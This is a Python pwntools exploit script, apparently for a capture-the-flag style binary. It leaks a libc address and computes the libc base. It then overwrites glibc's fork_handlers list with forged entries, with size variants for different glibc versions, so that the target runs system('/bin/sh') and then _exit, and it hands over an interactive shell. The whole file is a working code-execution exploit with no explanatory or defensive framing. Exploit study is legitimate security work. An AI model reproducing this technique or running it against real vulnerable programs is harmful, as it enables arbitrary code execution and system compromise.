#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"

io = process("./vuln_patched")
# io = remote("localhost", 9999)

libc = ELF("./libc.so.6")

# glibc 2.28-2.35
# HANDLER_SZ, HAS_ID = 0x20, False
# glibc 2.36+
HANDLER_SZ, HAS_ID = 0x28, True


def header(array_ptr, used):
    return p64(used) + p64(used) + p64(array_ptr)


def handler_array(*funcs):
    assert funcs
    if not HAS_ID:
        data = bytearray(HANDLER_SZ * len(funcs) - 0x18)
        for off, fn in zip(range(0, len(data), HANDLER_SZ), funcs[::-1]):
            data[off : off + 8] = p64(fn)
        return bytes(data)
    else:
        data = bytearray(HANDLER_SZ * len(funcs))
        for i, fn in enumerate(funcs[::-1]):
            off = i * HANDLER_SZ
            data[off : off + 8] = p64(fn)
            data[off + 0x20 : off + 0x28] = p64(i)
        return bytes(data)


def forge(base, *funcs, rdi=None):
    assert funcs
    arr = handler_array(*funcs)

    if rdi is None:
        used = len(funcs)
        array_ptr = base + 0x18
    else:
        used = rdi
        array_ptr = (base + 0x18 - (used - len(funcs)) * HANDLER_SZ) % (1 << 64)

    return header(array_ptr, used) + arr


io.recvuntil(b"gift: ")
leak_line = io.recvline().strip()
stdin_leak = int(leak_line, 16)
log.success(f"stdin leak: {hex(stdin_leak)}")

libc.address = stdin_leak - libc.sym["_IO_2_1_stdin_"]
log.success(f"libc base: {hex(libc.address)}")

# fork_handlers' address in glibc 2.36+ = <re_syntax_options@@GLIBC_2.2.5+0x80>
fork_handlers = libc.sym.re_syntax_options + 0x80
log.success(f"fork_handlers: {hex(fork_handlers)}")

cmd_offset = len(forge(fork_handlers, libc.sym.system, libc.sym._exit))
cmd_addr = fork_handlers + cmd_offset

data = forge(fork_handlers, libc.sym.system, libc.sym._exit, rdi=cmd_addr)
data += b"/bin/sh\x00"

req = p64(fork_handlers) + p64(len(data))
io.send(req)
io.send(data)

io.interactive()
